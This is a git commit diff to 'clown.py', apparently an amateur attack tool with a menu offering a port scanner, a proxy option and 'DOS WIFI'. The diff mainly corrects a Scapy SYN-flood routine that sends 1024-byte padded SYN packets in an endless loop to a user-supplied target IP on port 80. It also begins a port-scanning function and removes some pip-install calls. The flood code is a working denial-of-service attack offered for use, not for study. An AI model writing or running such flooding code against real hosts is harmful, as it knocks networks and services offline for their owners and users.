d3acc400a46d907b52089bf033365b88f41e2831
Mr1Nas <144234582+Mr1Nas@users.noreply.github.com>
2023-11-03 16:54:17 +0330

    Update clown.py

--- clown.py
+++ clown.py
@@ -6,29 +6,25 @@ import threading
 import requests
 from bs4 import BeautifulSoup
 import socket
-import subprocess
-subprocess.call("py -m pip install menufather")
-subprocess.call("py -m pip threading")
-subprocess.call("py -m pip bs4")
-subprocess.call("py -m pip requests")
-subprocess.call("py -m pip install scapy")
+
 tite = "𝖈𝖑𝖔𝖜𝖓"
 bot = ["1-PORT SCANNER","2-PROXY","3-DOS WIFI","4-EXIT"]
 menu = menufather.Menu(title=tite,items=bot)
 
 menu.show()
 while True:
-    time.sleep(1)
+    time.sleep(0.1)
     select = menu.get_selected_item()
     if select==2:
         target_ip = input("enter target ip (WIFI IP):")
         target_port= 80
         ip = IP(dst=target_ip)
-        tcp = TCP(sport=RandShort() , dport=target_port , flags = "S")
-        row = RAW(b"X" * 1024)
-        packet = ip / tcp / row
+        tcp = TCP(sport=RandShort() , dport=target_port, flags="S")
+        raw = Raw(b"X" * 1024)
+        packet = ip / tcp / raw
         send(packet, loop = 1,verbose = 0)
     if select ==0:
+       
         ipaddr = input("enter ip addres for check port: ")
         def port_scann(port):
             host = ipaddr
